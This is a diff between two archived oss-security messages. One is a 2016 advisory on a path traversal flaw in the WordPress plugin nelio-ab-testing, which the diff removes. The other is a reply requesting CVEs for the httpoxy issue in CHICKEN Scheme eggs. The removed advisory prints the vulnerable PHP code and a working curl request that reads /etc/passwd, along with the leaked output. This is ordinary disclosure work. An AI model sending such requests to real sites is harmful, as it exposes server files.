@@ -1,118 +1,53 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/05/10/1
-Message-ID: <20160510062831.GA18384@nixu.com>
-Date: Tue, 10 May 2016 09:28:31 +0300
-From: Henri Salo <henri.salo@...u.com>
-To: <oss-security@...ts.openwall.com>
-Subject: WordPress plugin nelio-ab-testing path traversal vulnerability
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/07/21/8
+Message-ID: <20160721184148.GO26276@scully.more-magic.net>
+Date: Thu, 21 Jul 2016 20:41:48 +0200
+From: Peter Bex <peter@...e-magic.net>
+To: oss-security@...ts.openwall.com
+Subject: Re: A CGI application vulnerability for PHP, Go, Python and others
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
+On Mon, Jul 18, 2016 at 08:17:03AM -0600, Kurt Seifried wrote:
+> Essentially there are two main cases where a CVE is assigned for the
+> httpoxy issue:
+> 
+>    1.
+> 
+>    A web server, programming language or framework (and in some limited
+>    situations the application itself) sets the environmental variable
+>    HTTP_PROXY from the user supplied Proxy header in the web request, or sets
+>    a similarly used variable (essentially when the request header turns from
+>    harmless data into a potentially harmful environmental variable)
 
-Product: WordPress plugin nelio-ab-testing (Nelio AB Testing)
-Product URL:
-    https://wordpress.org/plugins/nelio-ab-testing/
-    https://nelioabtesting.com/
-Vendor: Nelio Software
-    http://neliosoftware.com/
-    https://profiles.wordpress.org/nelio/
+This isuee affects the CHICKEN egg "spiffy-cgi-handlers", which is an
+optional add-on to add CGI and FastCGI support to the Spiffy web server.
+Could I have a CVE for this issue?
 
-Vulnerability type: Improper Limitation of a Pathname to a Restricted Directory
-CWE: https://cwe.mitre.org/data/definitions/22.html
-OVE: OVE-20160509-0045
-Vulnerable versions: 4.4.4
-Fixed version: 4.5.0
-Vendor notification: 2016-03-27
-Solution date: 2016-04-08
-Public disclosure: 2016-05-10
+All versions before 0.5 are affected.  An announcement was made to
+http://lists.gnu.org/archive/html/chicken-announce/2016-07/msg00000.html
 
-Description of the plugin (from WordPress Plugin Directory):
+The spiffy-cgi-handlers code was part of the spiffy web server before
+version 5.0, so earlier versions of that egg were also affected.  Strictly
+speaking, I think this deserves another CVE because it's a different
+piece of software.
 
-A/B Testing, conversion rate optimization, and beautiful Heatmaps specifically
-designed for WordPress.
+>    2.
+> 
+>    A web application makes use of HTTP_PROXY or similar variable unsafely
+>    (e.g. fails to check the request type) resulting in an attacker controlled
+>    proxy being used (essentially when HTTP_PROXY is actually used unsafely)
 
-Vulnerability details:
+I believe this affects the CHICKEN egg "http-client", when used in a CGI
+context when the calling server unsafely passes "Proxy" as "HTTP_PROXY".
+Could I have a CVE for this issue as well?
 
-The software uses external input to construct a pathname that is intended to
-identify a file that is located underneath a restricted parent directory, but
-the software does not properly neutralize special elements within the pathname
-that causes the pathname to resolve to a location that is outside of the
-intended directory.
+It affects http-client versions before 0.10 (the very first version, 0.1,
+is not affected because it had no proxy support).
 
-Risk:
+An announcement for this is included in the message at the
+aforementioned URL.
 
-The attacker is able to read the contents of files and expose sensitive data. If
-the targeted file is used for a security mechanism, then the attacker is able to
-bypass that mechanism.
+Cheers,
+Peter Bex
 
-Affected code:
-
-./nelio-ab-testing/includes/admin/admin-controller.php
-527                 public function generate_html_content() {
-528                         if ( isset( $_POST['filename'] ) && isset( $_POST['classname'] ) ) {
-529                                 $file  = $_POST['filename'];
-530                                 $class = $_POST['classname'];
-531                                 require_once( $file );
-532                                 call_user_func( array ( $class, 'generate_html_content' ) );
-533                         }
-534                 }
-
-Notes:
-
-Authentication required.
-
-Steps to reproduce:
-
-curl -i -s -k  -X 'POST' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; \
-rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.7.1' -H 'Content-Type: \
-application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: \
-XMLHttpRequest' -b '' --data-binary \
-$'action=nelioab_get_html_content&filename=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&classname=NelioABExperimentsPageController' \
-'http://wordpress.example.org/wp-admin/admin-ajax.php'
-HTTP/1.1 200 OK
-Date: Thu, 24 Mar 2016 17:39:06 GMT
-Server: Apache/2.4.10 (Debian)
-X-Robots-Tag: noindex
-X-Content-Type-Options: nosniff
-Expires: Wed, 11 Jan 1984 05:00:00 GMT
-Cache-Control: no-cache, must-revalidate, max-age=0
-Pragma: no-cache
-X-Frame-Options: SAMEORIGIN
-Vary: Accept-Encoding
-Content-Length: 1358
-Content-Type: text/html; charset=UTF-8
-
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-...
-
-Timeline:
-2016-03-27: Reported to vendor.
-2016-04-08: Vendor fixes the issue.
-2016-05-10: Public disclosure.
-
-- -- 
-Henri Salo
-Security Specialist, Nixu Oyj
-Mobile: +358 40 770 5733
-PL 39 FIN (Keilaranta 15)
-FIN-02151 Espoo, Finland
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
-
-iQIcBAEBAgAGBQJXMX+PAAoJEHu3+uinl6pabd8QAKZPkdJswdtXgKthn6ndgwxW
-3IXzv6ZRlBC/Sf7CyfwY1H/xIUwBXKEOhukwqJqopQTQiWh4gQRfGPgjqF935d4x
-FXM4MYoiIqDgj5N1cDbsj3E/SuVI4ux4Yn83gVBbjiuxXVNV4a9Dynn64I4BErj3
-gIGOFHtjN7mtrtWoK7NfpF87SeZai5sDtuKrvDmUZMSYHZN+gpAoB+scC/pTyYgR
-skiMThtKSJwqd1vg1mVEb0J/cX1a3QRyy8WvLZXzr7GaYwr7zwLhJ6M13MrCdBRV
-r/3yE1xOVz8jL7NwEDOhuop65OMMeTROjB6AVfBv0LgS3ghUZBCM8IQAGSVkggAH
-ZUswrOYYYXNhdJ+8gcAHNErRn8sNPMJbH1QNRnTCJQv3t6FazutFWQkxkG5B3uvQ
-xKWmR72g3m7TFZcvbzXRRE5Kblb8ouUxUY4GW66nqZkSMlfGpqmU2/GvgRgsZbKp
-x+qeBliqw1/03Xi70csMr8HE/HrGf7apC93kmr3gYb698thkpQY3iDi+vfD6njn4
-weo0NywDvODf8M8smUlSXYY2pYMzqw34Kay/NL0intRjoGpgzjl44C2HxVnAC1tg
-DYolXVSI33DVFfUIu+zTeuu3zndf2nDeyoho8yKuSdxJdeA/plxztfv6Eh/altCW
-xmi6wOcNKaaf5fgnZw/u
-=E1RA
------END PGP SIGNATURE-----
+Download attachment "signature.asc" of type "application/pgp-signature" (474 bytes)
